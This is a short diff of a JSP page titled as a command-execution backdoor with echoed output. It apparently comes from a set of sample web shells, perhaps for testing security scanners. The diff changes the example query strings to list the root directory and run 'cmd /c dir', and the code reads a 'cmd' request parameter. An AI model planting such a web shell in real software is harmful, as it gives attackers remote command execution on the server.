@@ -10,8 +10,8 @@
 <body>
     <h1>004 - 命令执行后门（有回显）</h1>
 <%
-String linux_querystring = "?cmd=ls";
-String windows_querystring = "?cmd=dir";
+String linux_querystring = "?cmd=ls+-la+/";
+String windows_querystring = "?cmd=cmd+/c+dir";
 String output = "";
 String cmd    = request.getParameter ("cmd");
 if (cmd != null)
